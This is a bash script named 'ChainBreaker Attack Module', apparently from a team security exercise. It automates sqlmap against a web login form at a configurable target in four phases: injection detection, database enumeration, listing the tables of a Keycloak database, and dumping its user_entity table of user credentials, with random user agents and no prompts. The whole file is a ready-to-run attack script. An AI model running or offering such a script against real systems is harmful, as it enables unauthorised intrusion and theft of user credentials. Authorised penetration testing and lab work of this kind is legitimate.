#!/bin/bash
# =============================================================
# M3 — ChainBreaker Attack Module
# Script : sqlmap_attack.sh
# Purpose: Automated SQL injection detection and exploitation
#          against web application endpoints
# Author : Member 3 — Attacker
# Usage  : chmod +x sqlmap_attack.sh && ./sqlmap_attack.sh
# =============================================================

set -euo pipefail

TARGET_IP="${1:-192.168.1.100}"
TARGET_PORT="${2:-8080}"
TARGET_URL="http://$TARGET_IP:$TARGET_PORT"
OUTPUT_DIR="./sqlmap_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "============================================="
echo "  ChainBreaker — SQLMap Injection  [M3]"
echo "  Target : $TARGET_URL"
echo "  Output : $OUTPUT_DIR"
echo "============================================="

mkdir -p "$OUTPUT_DIR"

# ── PHASE 1: Detect SQL Injection on Login Form ───────────────
echo ""
echo "[1/4] Testing login form for SQL injection..."
sqlmap -u "$TARGET_URL/login" \
       --forms \
       --batch \
       --level=3 \
       --risk=2 \
       --random-agent \
       --output-dir="$OUTPUT_DIR/phase1_detect_${TIMESTAMP}" \
       2>&1 | tee "$OUTPUT_DIR/phase1_log_${TIMESTAMP}.txt" || true

echo "[+] Detection results → $OUTPUT_DIR/phase1_detect_${TIMESTAMP}/"

# ── PHASE 2: Enumerate Databases ─────────────────────────────
echo ""
echo "[2/4] Enumerating available databases..."
sqlmap -u "$TARGET_URL/login" \
       --forms \
       --batch \
       --level=2 \
       --risk=2 \
       --random-agent \
       --dbs \
       --output-dir="$OUTPUT_DIR/phase2_dbs_${TIMESTAMP}" \
       2>&1 | tee "$OUTPUT_DIR/phase2_log_${TIMESTAMP}.txt" || true

echo "[+] Database list → $OUTPUT_DIR/phase2_dbs_${TIMESTAMP}/"

# ── PHASE 3: Dump Target Database Tables ─────────────────────
echo ""
echo "[3/4] Dumping tables from 'keycloak' database..."
sqlmap -u "$TARGET_URL/login" \
       --forms \
       --batch \
       --level=2 \
       --risk=2 \
       --random-agent \
       -D keycloak \
       --tables \
       --output-dir="$OUTPUT_DIR/phase3_tables_${TIMESTAMP}" \
       2>&1 | tee "$OUTPUT_DIR/phase3_log_${TIMESTAMP}.txt" || true

echo "[+] Table list → $OUTPUT_DIR/phase3_tables_${TIMESTAMP}/"

# ── PHASE 4: Dump User Credentials ───────────────────────────
echo ""
echo "[4/4] Dumping user_entity table (credentials)..."
sqlmap -u "$TARGET_URL/login" \
       --forms \
       --batch \
       --level=2 \
       --risk=2 \
       --random-agent \
       -D keycloak \
       -T user_entity \
       --dump \
       --output-dir="$OUTPUT_DIR/phase4_dump_${TIMESTAMP}" \
       2>&1 | tee "$OUTPUT_DIR/phase4_log_${TIMESTAMP}.txt" || true

echo "[+] User dump → $OUTPUT_DIR/phase4_dump_${TIMESTAMP}/"

# ── Summary ───────────────────────────────────────────────────
echo ""
echo "============================================="
echo " [DONE] SQLMap scan complete."
echo ""
echo " Output structure:"
ls -lh "$OUTPUT_DIR/" 2>/dev/null
echo "============================================="
